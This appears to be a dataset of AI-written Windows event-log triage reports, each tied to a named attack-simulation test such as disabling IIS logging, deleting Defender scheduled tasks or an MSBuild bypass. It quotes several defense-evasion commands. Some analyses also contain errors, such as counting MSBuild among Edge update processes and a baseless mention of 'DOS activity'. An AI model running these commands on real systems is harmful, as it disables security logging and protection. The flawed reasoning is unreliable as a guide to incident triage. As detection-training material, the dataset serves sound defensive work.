   - `whoami.exe` execution records the retrieval of user identity details. While not inherently suspicious, when combined with other activities, it can be part of reconnaissance to understand the privileges of the compromised account.

3. **Executable from Temporary Directory**:
   - A suspicious entry is the execution of `msiexec.exe` with an MSI file located in a Temp directory: `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_EXE.msi""`. Files executed from a Temp directory can be indicative of malicious installation processes or exploit payloads.

4. **Running of Unknown Executable**:
   - Execution of a temporary file: `C:\\Windows\\Installer\\MSIA30E.tmp` with no version or description data, executed with administrative privileges, which is unusual and might be malicious.

5. **End-user Actions** with High Integrity Levels:
   - Commands being run with a High Integrity Level could suggest that admin-level privileges were leveraged, increasing the potential risk if the execution is unauthorized.

6. **Installation Indicators**:
   - `MsiInstaller` logs indicate an installation: ""file file Test Installer -- Installation completed successfully."" This could be normal behavior if it's within scheduled or known maintenance; however, without context, it stands out as a point of interest.

7. **Frequent Process Executions**:
   - Multiple instances of `conhost.exe` run, typically associated with command-line applications in Windows, not suspicious by themselves but noteworthy in context with other unusual behavior.

### Assessment:
The log entries, particularly the execution of an unknown MSI from a Temp directory and repeated use of 'wevtutil.exe', suggest suspicious activity that warrants further investigation. The entries do not conclusively prove malicious behavior without additional context but indicate potential misuse or abnormal use of system processes which deviate from expected behavior patterns.

### Threat Assessment & Recommendation:
- **Resolution**: **SUSPICIOUS**
  - **Risk**: Possible unauthorized software installation.
  - **Next Steps**: 
    - Conduct a more detailed review of user activity around the timestamp of the suspicious events.
    - Examine network traffic logs for any suspicious external communication.
    - Verify the legitimacy of the executed MSI file and the necessity of `wevtutil` usage.
    - Investigate the new installations or changes noted in the logs and cross-reference them with IT change management records.
    - Run a threat intelligence check on all file signatures and hashes noted.

The activity observed requires confirmation through a more holistic review involving additional log sources and endpoint data to conclude the nature of these actions confidently."
Azure - Eventhub Deletion,"Upon analyzing the provided event logs consisting of PowerShell, Sysmon, System, Security, and Application logs, a few patterns and activities stand out as potentially suspicious or anomalous. Below is a detailed analysis of these logs:

### PowerShell Log Analysis:
1. **Registry and PowerShell Execution:**
   - The PowerShell logs indicate the execution of commands that attempt to connect to Azure Active Directory and remove an Azure Event Hub using the `Remove-AzEventHub` command (`powershell.exe & {$secure_pwd = """" | ConvertTo-SecureString -AsPlainText -Force...}`).
   - The use of `ConvertTo-SecureString -AsPlainText -Force` raises red flags typically associated with hardcoding or misusing credentials in scripts, which could lead to credential exposure or misuse.

2. **Unusual Command Usage:**
   - The script attempts to remove an Azure Event Hub ('test_eventhub') without providing specific arguments for the `ResourceGroupName` or `Namespace`, which could imply improper use or misuse of scripts or automation.

### Sysmon Log Analysis:
1. **Repeated Process Execution:**
   - Several known legitimate Windows tools (`wevtutil.exe`, `conhost.exe`, `powershell.exe`, `whoami.exe`) are executed multiple times under the same user (`SERVER002\admin_test`), suggesting potential administrative or investigative actions taken by a user with elevated privileges.
   - The use of `wevtutil.exe` and `whoami.exe` is typical in environments where system logs are queried or checked for processes running under certain user accounts. While not inherently malicious, their repetitive usage without context could warrant further investigation.

2. **Edge Update Activity:**
   - There are multiple entries for `setup.exe`, part of the Microsoft Edge Update process, run under the `NT AUTHORITY\SYSTEM` account. While this may seem normal due to automatic updates, the frequency and detail warrant confirming that this activity aligns with regular update schedules.

3. **High Integrity Level Process Executions:**
   - Processes like `powershell.exe` and `whoami.exe` are run with high integrity, indicating elevated privileges, which could present a risk if used with malicious intent.

### Security Log Analysis:
- **Group Membership Query (Event ID 4799):**
   - An event indicating querying of group membership for the `Builtin\Users` group by the Edge Update setup process. It is generally normal for installations or updates but should be noted since it ties into the setup activities seen in Sysmon logs.

### Threat and Risk Assessment:
- **Potential Indicators of Compromise (IOCs):**
  - Use of PowerShell to execute scripts that interact with Azure resources in a potentially insecure manner (hardcoded credentials).
  - Multiple executions of administrative utilities (`wevtutil.exe`, `whoami.exe`) by a user with elevated privileges without context.
  - Unusual patterns in process execution related to Microsoft Edge updater with elevated privileges.

### Guidance and Recommendations:
- **Further Investigation:**
  - Evaluate the legitimacy of the PowerShell script execution with the parties involved to determine whether it was an authorized administrative action.
  - Review standard operating procedures for Azure and Event Hub management to ensure no policy violations.
  - Investigate whether the Edge update and utilities' execution aligns with scheduled tasks or required updates, and confirm if any deviation exists.

- **Security Hardening:**
  - Employ security measures to detect and block the execution of PowerShell scripts with hardcoded password usage and ensure logging is enabled for all script executions and administrative actions.
  - Regularly monitor and review logs to identify patterns of unusual activity in high-integrity processes.

### Final Assessment:
- **Resolution:** SUSPICIOUS

The current logs contain activities that are not definitively malicious but warrant further investigation to rule out potential misuse or unauthorized actions."
MSBuild Bypass Using Inline Tasks (C#),"### Log Analysis

Upon examining the provided Sysmon logs, we can infer a few key points regarding system activities and potential indicators of compromise:

1. **Process Creation and Execution:**
   - Numerous routine processes created and executed include `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and various Microsoft Edge Update processes. 
   - Microsoft Edge Update processes (e.g., `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`) are repeatedly executed, suggesting normal software update activity.

2. **Potentially Suspicious Processes:**
   - **`cmd.exe` Invocation and MSBuild:** The logs reveal command-line execution involving `cmd.exe` to run `msbuild.exe`. The command sequence, `""cmd.exe"" /c MSBuild.exe...`, could be indicative of potential attempts to compile or build a project or script. This behavior is sometimes observed in a compromised environment where scripts are executed maliciously using MSBuild to avoid detection.
   - **Use of `wevtutil.exe`:** While `wevtutil.exe` is a legitimate utility for managing event logs, its repeated execution without clear context in the logs can be suspicious, especially if intended for log clearing or modification.

3. **OS and Edge Updates:**
   - The numerous references to Edge Updates (e.g., `MicrosoftEdgeUpdate.exe`, `MSBuild.exe`) align with expected automatic update routines for Windows and Microsoft Edge installations. These exhibit normal behavior given their context, including updating tasks with system integrity (executed by `NT AUTHORITY\SYSTEM`).

4. **Process Integrity Levels:**
   - Processes, including `whoami.exe` and `HOSTNAME.EXE`, run with a High Integrity level under the `SERVER002\admin_test` account, suggesting actions performed with administrative rights.
   - Other processes tied to the `NT AUTHORITY\SYSTEM` user, like Edge update executions, indicate valid system-level activities typically associated with legitimate software updates.

5. **Command Patterns and Parent-Child Process Relationships:**
   - Relationship between `cmd.exe` and subsequent `MSBuild` execution stands out as a possible red flag contingent on the context of the operation, especially tied to the endpoint's use case or any unauthorized script execution.

### Assessment

**Resolution:** **SUSPICIOUS**

**Rationale:**
- While many operations align with system updates and typical administrative tasks (like Edge auto-update), the usage pattern of `cmd.exe` running `MSBuild.exe` along with multiple `wevtutil.exe` processes stand out as potential indicators of malicious activity or a precursor to lateral execution and persistence.
- Such activities necessitate closer scrutiny to rule out potential script-based attacks leveraging legitimate system tools to evade detection.

### Guidance

- **Further Investigation:** Focus on determining the intent and origin of the `cmd.exe` and `MSBuild.exe` execution. Investigate any associated scripts, payloads, or network activity leading to these commands. Analyze user behavior around these timestamps for anomalies or deviations from typical use patterns.
- **Ensure File Integrity and Source Validation:** Verify the integrity of files in the Microsoft Edge update directories and confirm they match legitimate versions from trusted sources.
- **Implement Additional Monitoring and Logging Policies:** Close audit gaps in security logs to ensure they capture complete data trails for system critical operations.
- **Remediation Strategy:** Should any strange or unwanted activity be confirmed as malicious, isolate the endpoint and conduct thorough system scans using updated antivirus/malware signatures."
Create ADS PowerShell,"### Detailed Analysis of the Logs:

Upon analysis of the provided logs, there are several key points and observations that can be made:

#### 1. Application Log:
- The logs from the ""Microsoft-Windows-Security-SPP"" and ""edgeupdate"" providers do not indicate any apparent malicious activity. These seem to be standard service stop/start operations typical in software like Microsoft Edge and Windows services. There is no anomaly detected from these entries alone.

#### 2. Windows PowerShell Log:
- The execution of a PowerShell script with embedded command-line instructions involving Alternate Data Streams (ADS) is observed. The script includes commands for writing 'test' values into ADS, which is uncommon in typical user scenarios and may be indicative of an attempt to hide data or obfuscate actions.
- PowerShell is a powerful scripting environment and can be used benignly for administrative tasks, but given the use of ADS, this could potentially indicate malicious activity or at least suspicious behavior that requires further investigation.

#### 3. Sysmon Log:
- Multiple applications typically related to system operations and updates, like `wevtutil.exe`, `conhost.exe`, `svchost.exe`, and `MicrosoftEdgeUpdate.exe`, are observed running under the `SERVER002\admin_test` account. The processes themselves are legitimate, but the context in which they are executing alongside other suspicious activity is noteworthy.
- The frequent execution of `wevtutil.exe` could suggest log file copying or alteration, which may be associated with anti-forensic techniques in compromise scenarios.
- The direct invocation of processes using new process IDs (`ProcessId`) and the absence of user interaction may suggest automated or script-driven activity on the system.

#### 4. Security Log:
- Multiple logon events (`4624`) and privilege assignments (`4672`) displaying accounts related to `SYSTEM` and domain activities are present, but without direct evidence of unauthorized access. The high-integrity-level indicators are more consistent with system processes or administrative tasks rather than user-initiated interactive logons.
- Processes like `taskhostw.exe` querying information about various user accounts (`4798` events) might be concerning if uninitiated by normal administrative functions and could suggest system enumeration or reconnaissance operations by an unidentified script or malware.

### Assessment of the Situation:
Based on the analysis, the Windows event logs exhibit behavior that is not definitively malicious but is certainly suspicious. The presence of potential DOS activity with PowerShell ADS manipulation and frequent, script-like process executions within Sysmon logs necessitates caution.

### Identified Threats or Risks:
- **Suspicious PowerShell Usage**: Usage of ADS within PowerShell, a technique often leveraged for concealing malicious commands or payloads.
- **Potential Anti-Forensic Activity**: The usage pattern of system utilities might suggest attempts to erase or modify logs.

### Guidance on How to Proceed:
1. **Immediate Investigation**: Conduct a thorough review and analysis of associated PowerShell scripts and their origins. Determine if they are part of an administrative task or unauthorized.
2. **Enhanced Monitoring**: Implement deeper event logging to capture more PowerShell activity and Sysmon logs for unexpected behaviors.
3. **User Activity Audit**: Check for recent logon sessions or privilege changes on the accounts involved. 
4. **Cross-Reference with Threat Intelligence**: Scan hashes and process behaviors identified against threat intelligence databases to confirm benignity or known threats.

### Resolution:
Given the available evidence, the activity in these logs falls into the category of **SUSPICIOUS** due to the potential misuse of PowerShell and the contextual activity observed in system utilities. Further investigation is warranted to rule out or confirm malicious intent or activity."
Invoke CHM Simulate Double click,"Upon reviewing the logs, several observations can be made concerning potential suspicious activities:

1. **Frequent Use of PowerShell**: 
   - Several instances of PowerShell are being executed. Particularly of note, there are instances where the -ExecutionPolicy flag is set to Restricted, which is generally a good security practice, as it prevents the execution of potentially harmful scripts.
   - A specific command involving `Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm` and another involving inspecting .inf files with a certain pattern for installation sections are run. These commands could represent legitimate administrative activity or attempts to execute scripts with embedded code or configurations.

2. **Processes Executed by ""admin_test""**:
   - Multiple Sysmon events indicate processes like `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and `whoami.exe` executed under the user `SERVER002\\admin_test`. The execution of `wevtutil.exe` raises concerns as it can be used to export, erase or manage event logs often associated with cleaning up logs after malicious activities.

3. **Processes Executed by SYSTEM**:
   - Several PowerShell processes are being executed by `NT AUTHORITY\\SYSTEM` which is atypical and demands further scrutiny. These processes executed commands like writing host outputs and analyzing installation files in the Windows directory. 

4. **Console Host (conhost.exe) Activity**:
   - Multiple `conhost.exe` activities occur, usually serving as a gateway between the command line console and the running command. While its presence is not unusual, the frequency and lack of corresponding command or task details raise concerns.

5. **Event Logs Manipulation Concerns**:
   - The presence of `wevtutil.exe` execution could indicate tampering or intended manipulation with the event logs. This executable is a command-line utility that enables exporting, clearing, and querying of event logs, which is a red flag if found without a clear, legitimate administrative context.

6. **General Log Patterns**:
   - No entries in the Windows Security logs can also be a sign of potential malicious activity, as attackers often attempt to suppress or clear logs to avoid detection. However, the absence alone isn't decisive evidence.

### Assessment:
Considering the evidence, there are enough indicators to suspect potential malicious behavior. The combination of frequent PowerShell usage with commands to potentially hide actions, along with wevtutil usage, suggests an attempt might have been made to execute unauthorized actions and possibly cover tracks.

### Resolution: 
**SUSPICIOUS**

### Recommendations:
- **Further Investigation**: Conduct a thorough search of scripts and commands executed via PowerShell to determine their legitimacy.
- **User account checks**: Investigate the user `SERVER002\\admin_test` for any anomalies and verify whether the activities match expected patterns for this account.
- **Check for Indicators of Compromise (IOCs)**: Search for any known IOCs related to the observed activities.
- **Review System Integrity**: Use tools like Windows Defender or a similar endpoint management solution to ensure no malicious code is present.
- **Enhance Monitoring**: Increase the scrutiny of PowerShell script logs and Sysmon event logs to better detect unusual patterns in the future.
- **Audit Privilege Escalation Attempts**: Chase down any privilege escalation evidence to ensure no unauthorized access was obtained. 

It's crucial to act promptly to determine if a breach has occurred and to protect sensitive company data from potential compromise."
Delete an entire folder - Windows PowerShell,"Upon reviewing the provided logs from the Windows host, several points can be derived that indicate potential threats or benign operations. Here is the detailed analysis:

### Detailed Analysis

1. **Microsoft Edge Update Activity**:
   - There are numerous Sysmon events indicating the execution of `MicrosoftEdgeUpdate.exe` under the `NT AUTHORITY\SYSTEM` account. 
   - The sequence of events shows processes originating from Microsoft Edge Update binaries, which are standard processes used for updating Microsoft Edge.
   - Multiple instances of MicrosoftEdgeUpdateSetup and related components like `MicrosoftEdgeUpdateComRegisterShell64.exe` were executed with command-line parameters that are consistent with automated or scheduled update processes. These activities are typical during a software update cycle.

2. **Suspicious PowerShell Use**:
   - A **PowerShell command** was observed: `Remove-Item -Path $env:TEMP\deleteme_folder_data.004 -Recurse`. This could be an administrative task or a script cleaning temporary data. However, such recursive removal commands should be monitored as they are sometimes abused by attackers for data removal.

3. **System Utilities Execution**:
   - Executions of `whoami.exe` and `hostname.exe` by `SERVER002\admin_test` are noted. Although these utilities are legitimate and commonly used for user information gathering and system identification, frequent use without context can be suspicious in compromised environments.
   - Frequent execution of `wevtutil.exe`, which is a command-line utility for managing and querying event logs, is observed. This requires attention, as it might be involved in event log clearance attempts by an attacker.

4. **Service and System Management Processes**:
   - Execution of system and service management processes like `sppsvc.exe`, `WmiPrvSE.exe`, and `TrustedInstaller.exe` under `NT AUTHORITY\SYSTEM` are noted. These processes are common and usually don’t indicate malicious activity on their own unless triggered by unusual scripts or uncommon sources.
   
5. **Patterns & Sequences**:
   - The patterns observed, especially with Edge update processes, align with legitimate software update operations.
   - The chronological sequence of processes and commands indicate a batch of actions likely taking place via scheduled tasks or service operations.

### Assessment of the Situation
- The activities related to Microsoft Edge Updates and other system operations appear **benign**, consistent with routine software updates managed via an authorized configuration management system.
- The PowerShell command to delete a temporary directory, while potentially suspicious, doesn't inherently appear malicious without further context, but it should be audited to ensure it's a legitimate operation.

### Resolution
**Resolution: BENIGN**

- **Guidance**: Regular monitoring should continue, especially spotlighting the use of PowerShell, the wevtutil utility, and any unexpected sequences that don't align with user activity baselines or may point towards anomalous privilege execution patterns. Further context regarding why such PowerShell scripts are executed could enhance understanding. Periodic insider threat analysis may help fortify against misconfigurations or misused scripts.
"
Read volume boot sector via DOS device path (PowerShell),"Upon reviewing the provided Windows event logs, I conducted an analysis to identify any indicators of malicious activity. Here's the breakdown of the findings:

1. **System Logs:**
   - The logs reflect normal operations, such as security updates for Microsoft Defender Antivirus (KB2267602 with Version 1.419.608.0). These updates are routine and necessary for maintaining system security, showing no signs of malicious activities.

2. **Application Logs:**
   - Service activities, such as the stopping of ""edgeupdate"" and the state of Windows Defender being on, are noted. This indicates that Windows Defender is operational and the entry ""Windows Defender, SECURITY_PRODUCT_STATE_ON"" can be considered normal.

3. **Security Logs:**
   - The security logs predominantly feature repeated EventID 5379 entries, which relate to the use of MicrosoftAccount and WindowsLive attempts with a return code ""3221226021"" implying a status of ""Access is denied."" This could typically appear during normal failed authentication processes or due to misconfigured credentials and doesn't definitively indicate a security incident.

4. **PowerShell Logs:**
   - Multiple entries of PowerShell execution with a command creating a buffer and trying to read from a designated path (`C:\`). The use of such scripts could be a red flag suggesting attempts to read sensitive areas of the filesystem. This particular behavior could merit further investigation to ensure that it hasn't been used for malicious intent.

5. **Sysmon Logs:**
   - The Sysmon logs captured command executions often associated with standard Windows operations. However, there are entries of particular interest. The command observed with PowerShell using a sequence to read from paths (appearing in the PowerShell logs) is recurrent and peculiar. The processes like `whoami.exe`, `hostname.exe`, and wevtutil are executed by a user ""admin_test,"" which may be unusual if not routinely performed by administrative activity.

6. **Other Operations:**
   - Processes associated with Microsoft Edge Updates and other system activities such as `wuauclt.exe` running updates or `svchost.exe` executions are typical for Windows environments.

**Assessment and Conclusion:**

- The PowerShell activity present in the logs stands out as potentially abnormal due to its attempt to read directly from sensitive file paths using a script, creating a buffer. This kind of activity could suggest an attempt at reconnaissance or data collection by a threat actor.
  
- The presence of multiple EventID 5379, with repeated lists of failed access codes, could potentially relate to brute-force attempts, but the lack of evidence pointing to a breach or pattern consistent strictly with malicious behavior places them under potential false positives or configurations not impacting system integrity as of now.

Taking into account the details outlined and observations noticed:

**Resolution: SUSPICIOUS**

- The observed PowerShell command sequences merit a deeper investigation to ensure they are not being used for malicious purposes. It is recommended to review relevant scripts or commands executed during the window of reported activity on systems accessible by `admin_test`. Additionally, verifying permissions and access attempts can confirm any misconfigurations or unauthorized access attempts.

**Guidance on Proceeding:**

1. Conduct a detailed review of PowerShell scripts executed on the host.
2. Monitor any anomalous behavior in user `admin_test` activities and roles.
3. Verify the integrity of security configurations, and ensure all security updates are correctly implemented.
4. Follow-up with a review of network logs to correlate with potential lateral movement attempts or data exfiltration actions as precautionary subpoenas.

Implementing these steps should help ascertain whether these findings could translate to a potential compromise and any needed remedial actions."
Delete Windows Defender Scheduled Tasks,"After reviewing the provided event logs, the primary focus points include System, Security, Application, Sysmon, and Windows PowerShell events. Let's analyze and assess these entries:

### Analysis:

1. **System Logs:**
   - Kernel-General and Time-Service logs primarily indicate time synchronization events. These are typically benign, indicating normal system operations such as time updates or adjustments.
   
2. **Security Logs:**
   - Event ID 4616 records time changes by the LOCAL SERVICE account. Given the close timing and zero time difference adjustments (as seen in both the NewTime and PreviousTime fields), this aligns with system time correction activities and does not directly indicate malicious intent.

3. **Application Logs:**
   - The Event ID from the Software Protection Platform Service (Event ID 16384) is routine and usually reflects license checks and similar activities, not inherently malicious.

4. **Sysmon Logs:**
   - There is a series of command-line executions involving `schtasks` and commands related to Windows Defender tasks.
   - Commands executed by `cmd.exe` include querying and deleting Windows Defender tasks, specifically: `Scheduled Scan`, `Cleanup`, `Verification`, and `Cache Maintenance`. 
   - Use of `schtasks` to delete defender tasks could be an advanced threat actor trying to disable security controls or a mislead administrative script. The high integrity level and user context (admin_test) suggest elevated privileges which are suspicious but not definitively malicious on their own without additional context.
   - Execution patterns involving `cmd.exe`, `conhost.exe`, and `schtasks.exe`, as well as tool usage such as `hostname.exe` and `whoami.exe`, point towards possible reconnaissance or system audit activities — suspicious, particularly in a high-profile target such as the CEO's machine.
   
5. **Windows PowerShell Logs:**
   - There are no entries for PowerShell logs in the data provided. This absence doesn't imply any activity but should prompt verification if any PowerShell scripts or commands were executed during this time frame outside this log subset.

### Conclusion and Recommendations:

- **Resolution:** **SUSPICIOUS**
  - Despite the presence of some benign entries, the activity surrounding the manipulation of system scheduling tasks related to Windows Defender, especially deletions, demands closer scrutiny. This could indicate an attempt to subvert system defenses, a red flag for potential malicious activity. 

### Guidance on How to Proceed:
- **Further Investigation:** 
  - Perform a detailed audit and review user `admin_test` activities around the timestamp of suspicious events to determine their legitimacy.
  - Confirm whether these operations align with known and documented administrative tasks or scripts.
  - Check for any recent vulnerability disclosures or attack vectors that involve disabling security tools.
  - Examine PowerShell transcripts/logs for any parallel malicious or suspicious scripting activity.
  
- **Mitigation Steps:**
  - Reinstate and verify Windows Defender tasks operational status to ensure no lapse in protection.
  - Implement enhanced monitoring or logging on machines identified for suspicious task manipulation.
  - Ensure regular review of task scheduler and critical system service configurations, especially around executive and high-value targets like the CEO's system."
Msiexec.exe - Execute the DllUnregisterServer function of a DLL,"The logs provided offer insights into various activities on the Windows host. Upon reviewing the logs, I have identified several events that warrant closer examination for suspicious or anomalous activities.

### Analysis of Logs:

- **PowerShell and System Logs:** Unfortunately, these logs do not contain any entries, making it challenging to assess PowerShell activity or system-level events that could also be indicative of malicious activity or manipulation.

- **Application Log:**
  - The log entries primarily pertain to Edge Update service events on `Server002`, indicating the service stopped. While not inherently suspicious, if this service typically does not stop frequently or unexpectedly, it could warrant further investigation.

- **Sysmon Log:**
  - The Sysmon events indicate multiple processes executed by the user `SERVER002\admin_test`, notably including PowerShell and Windows management instrumentation processes like `wevtutil.exe` and `wsmprovhost.exe`.
  - The specific event involving `cmd.exe` executing `msiexec.exe` with a DLL (`MSIRunner.dll`) from a temporary path is particularly notable. The execution of installers from a temporary directory, especially with unconventional command-line arguments like `/z`, which isn't a standard flag for `msiexec.exe`, can be considered suspicious and may suggest an attempt to execute potentially unauthorized or malicious configurations or software.
  - Multiple instances of `conhost.exe` relating to console host handling seem to spawn in conjunction with expected console applications. However, given that the parent processes frequently involve runtime or system-critical processes (like `wevtutil.exe`), these entries could merit additional scrutiny if they deviate from standard operations.

- **Security Log:** No provided entries, suggesting no login or privilege escalation events were captured. However, the absence of these logs could impact the depth of the analysis.

- **Edge Update Activities:**
  - The consistent execution of Microsoft Edge Update processes and related setup executables is observable. There are several sessions of updates or installations taking place, indicating potential routine maintenance. However, unusual behavior like running an update from a temporary directory (e.g., `EUDFB.tmp`) should be confirmed against standard Edge update procedures.

### Assessment:

- **Suspicious Activity:** The use of `msiexec.exe` in combination with unconventional command-line options likely involving an external DLL poses a potential security risk, suggestive of either unauthorized software installation attempts or a potential security breach trying to leverage MSI for persistence or lateral movement.

- **Routine Updates:** There are numerous legitimate-looking Edge updates, indicating standard operational update activity for Microsoft programs.

### Recommendation:

Given the evidence gathered, the resolution for this investigation is **SUSPICIOUS**. The activity involving `msiexec.exe` requires further investigation to confirm whether it is standard for an operational process or indicative of a malicious attempt to manipulate software or system configurations. I recommend further steps:
- Correlate the identified processes and command-line arguments with known legitimate behaviors or past baselines.
- Investigate the temporary directories and DLL usage to assess for known malware presence.
- Review any available network logs or EDR alerts related to the system to capture a clearer picture of activities around this timeframe.
- Consider strengthening real-time monitoring and implementing rules to alert on such unconventional `msiexec.exe` executions in the future."
Allow Simultaneous Download Registry,"After reviewing the provided Windows event logs, I have identified several aspects of interest that could suggest anomalous activity:

### Detailed Analysis

1. **Frequent Execution of WEVTUTIL.EXE**:
   - **Occurrences**: Multiple instances of `C:\\Windows\\System32\\wevtutil.exe` execution are logged. 
   - **Context**: `wevtutil` is a command-line utility used for exporting, archiving, and clearing Windows event logs. While the use of this tool might be routine in some administrative contexts, its frequent execution could indicate that someone might be trying to manipulate or clear event logs to hide activity.

2. **Running of CMD.EXE with Registry Modifications**:
   - **Event**: `C:\\Windows\\System32\\cmd.exe` was executed with command-line instructions altering registry keys related to internet settings.
   - **Analysis**: Such modifications to the registry, specifically those that change connection settings, can be used to alter system behavior for data exfiltration or modify network traffic properties. The command being executed in this manner is a common technique used by malicious actors to make persistent changes to a user’s system configuration.

3. **WHOAMI and HOSTNAME Executions**:
   - **Occurrences**: A `whoami.exe` and `hostname.exe` command execution were recorded.
   - **Context**: These commands are typically benign and used to gather system and user information. However, when seen in conjunction with other suspicious activity, they may suggest reconnaissance efforts by an intruder.

4. **REG.EXE Executions for Registry Manipulation**:
   - **Details**: There are logged instances of `C:\\Windows\\System32\\reg.exe`, particularly focused on modifying settings related to concurrent connections for servers.
   - **Potential Implications**: This activity may imply preparations for changing how the system interacts with network resources and could be indicative of preparing the system for increased network traffic, possibly for data exfiltration.

### Assessment of Malicious Activity

The logs demonstrate a pattern of behavior involving altering critical system settings using command-line tools often associated with administrative tasks or potential malicious intent. Particularly concerning are the registry changes and frequent execution of event utility tools which could signal attempts to cover up tracks.

### Conclusion

Based on the cumulative evidence from the logs, there is a substantial suggestion of potential malicious activity. Although some tasks like running `hostname` and `whoami` are routine, their coexistence with registry changes and log-clearing actions via `wevtutil` flag suspicious activity.

**Resolution: SUSPICIOUS**

The behavior flagged in the logs requires further investigation to confirm or refute malicious intent. Immediate actions should include:

- Reviewing user activity logs for the account `SERVER002\\admin_test`.
- Correlating with network logs to check for unusual outbound connections.
- Conducting a comprehensive scan of the CEO's machine for malware.
- Interviewing the IT personnel for any authorized administrative tasks that might explain these log entries.

This approach ensures both a defensive posture against potential breaches and clarifies if the actions taken align with legitimate administrative activity."
Disable Windows IIS HTTP Logging via PowerShell,"After thoroughly analyzing the provided Windows event logs, the following observations and assessments are made:

### Observations:

1. **Service Activity:**
   - The Application logs indicate the stopping of the ""edgeupdate"" service, which is a normal process for Microsoft Edge updates.
   
2. **Time Change Events:**
   - Security and System logs show multiple time change events (EventID 4616) related to `svchost.exe`, which usually indicates time synchronization activities. These changes are minor and consistent with normal system operations using `time.windows.com` as the NTP source.

3. **Process Execution:**
   - Sysmon logs show standard Windows utility executions like `whoami.exe`, `conhost.exe`, and `svchost.exe`, which are consistent with regular administrative queries and process hosting activities.
   - Multiple executions of `MicrosoftEdgeUpdate.exe` under `NT AUTHORITY\SYSTEM`, indicating an update process for Microsoft Edge.
   - A notable PowerShell command altering IIS configuration to ""not log"" HTTP requests: `set-WebConfigurationProperty -PSPath ""IIS:\Sites\Default Web Site\"" -filter ""system.webServer/httpLogging"" -name dontLog -value $true`.

4. **PowerShell Activity:**
   - The PowerShell logs confirm the execution of a command that changes the IIS logging behavior to not log HTTP requests on the ""Default Web Site."" This action could be potentially malicious as it might be intended to hide other activities.

### Assessment:

- **Edge Update Activity:** The multiple `MicrosoftEdgeUpdate.exe` executions logged under `NT AUTHORITY\SYSTEM` for different operations like setup and update appear to be consistent with update procedures for Microsoft Edge.

- **Time Synchronization:** The adjustments in system time through `svchost.exe` using `time.windows.com` appear normal and expected for time synchronization tasks.

- **Command Execution:** While many commands are routine administrative or update actions, the PowerShell script altering IIS logging settings raises concern because disabling logging is often attempted by unauthorized users trying to cover traces of other malicious activity.

Given the observed PowerShell command targeting IIS logging, which may not be warranted if the user is a legitimate administrator without a clear business reason, this suggests potential misuse or compromise. It indicates the need for further investigation into who executed these commands and why.

### Recommended Actions:

1. **Audit User Activity:** Investigate `SERVER002\admin_test` user activity to determine if this PowerShell command was legitimate or indicated compromise.
  
2. **Review Web Server Configuration:** Check server and security logs to ensure no unauthorized or unexpected actions have occurred that need further forensic analysis.
  
3. **Verify Intention of Configuration Change:** Reach out to system administrators to confirm if there was an intended change to the IIS logging policy.
  
4. **Re-enable Logging:** If the PowerShell command is not verified as legitimate, re-enable HTTP logging on the IIS server to ensure all future activity is logged.

**Resolution: SUSPICIOUS**

The logs contain suspicious activity due to the PowerShell command that changes IIS logging settings without a discernible legitimate reason. Further investigation is necessary to determine the intention and context of this action."
Enforce Smart Card Authentication Through Registry,"To assess the provided Windows event logs, I'll focus on identifying any suspicious or anomalous behavior, signs of potential malicious activity, and determine the appropriate resolution for the investigation.

### Suspicious Events and Analysis:

1. **Edge Update in Temp Directory**:
   - **Sysmon EventID 5** shows `C:\Program Files (x86)\Microsoft\Temp\EU4B09.tmp\MicrosoftEdgeUpdate.exe` executed by `NT AUTHORITY\SYSTEM`.
   - Executables in temporary directories can be suspicious as attackers sometimes use this method to introduce malicious binaries. Legitimate executables typically reside in more secure locations.

2. **Use of `wevtutil.exe` and `conhost.exe`**:
   - Multiple executions of `C:\Windows\System32\wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`.
   - `wevtutil.exe` is used for managing Windows event logs, and its use by a non-system account could be suspicious. This activity by a non-system-related account should be investigated to ensure it’s not used to evade logging or modify logs.

3. **Registry Modification by cmd.exe**:
   - Sysmon EventID 1 shows `cmd.exe` executing with command-line arguments modifying registry: `reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f`
   - Unauthorized registry changes can signify privilege escalation, persistence mechanisms, or configuration changes by an attacker. Review of change intent and source required.

4. **Time Change Events**:
   - **System and Security Logs** indicate a back-and-forth time change executed by `svchost.exe`.
   - This could suggest attempts to alter log timestamps to obscure activity, though may also result from legitimate time sync issues if the rest of the system logs support that narrative.

### Assessment:

- **Anomalous Path for Executables**: The execution of an Edge Update file from a temporary directory, particularly with system-level privileges, stands out. Commonly, Edge updates are managed from a more standard path.
- **Log and Registry Manipulations**: The executions of `wevtutil.exe` and a registry key modification related to security settings (i.e., `scforceoption`) are highly suspect, especially within a close time frame and initiated under a user account possibly with administrative privileges.
- **Time Adjustments**: Though potentially benign, the recorded time changes warrant further inspection to ensure they are not linked with malicious log tampering efforts.

### Guidance on How to Proceed:

- **Investigate the source and legitimacy of the Edge Update executable**, ensure it is appropriately signed and cross-reference with known update binaries.
- **Perform an in-depth review of the admin_test account activity** around these events to ascertain if it is legitimate and matches normal administrative tasks. If not, consider revoking and refreshing credentials.
- **Audit and verify the necessity and source of Registry modifications**. Determine whether they align with an IT administrative task or if they reflect an unauthorized configuration change.
- **Check the Network and System Logs** extensively to confirm any incongruous behavior correlating with the time change events.

### Resolution:
Given the multiple suspicious activities mainly around unauthorized usage of system executables, potential log tampering attempts, and concerning registry alterations, the logs should be categorized as:
- **SUSPICIOUS**

Further investigation is required to confirm or dispel any threat and to ensure all anomalies are fully understood and addressed."
Decompile Local CHM File,"Upon analyzing the provided Sysmon logs, there are a few observations that might point to suspicious activities:

### Observations:

1. **Frequent Command Executions**:
   - The logs show a repetitive pattern of execution with `wevtutil.exe` and `conhost.exe` among others, executed by the same user (`SERVER002\admin_test`).
   - The `wevtutil.exe` process is primarily used for event log management and its frequent execution alongside `conhost.exe` can be a sign of scripts or tasks that are interacting with logs, possibly for log deletion or tampering, which is generally suspicious.

2. **Unusual Commands with cmd.exe**:
   - One log entry shows `cmd.exe` being executed with a command line parameter that involves `hh.exe -decompile`, which extracts content from a .chm (compiled HTML help) file. This can be indicative of an attempt to extract hidden or malicious scripts/binaries embedded within a chm file.

3. **High Integrity Level Process Execution**:
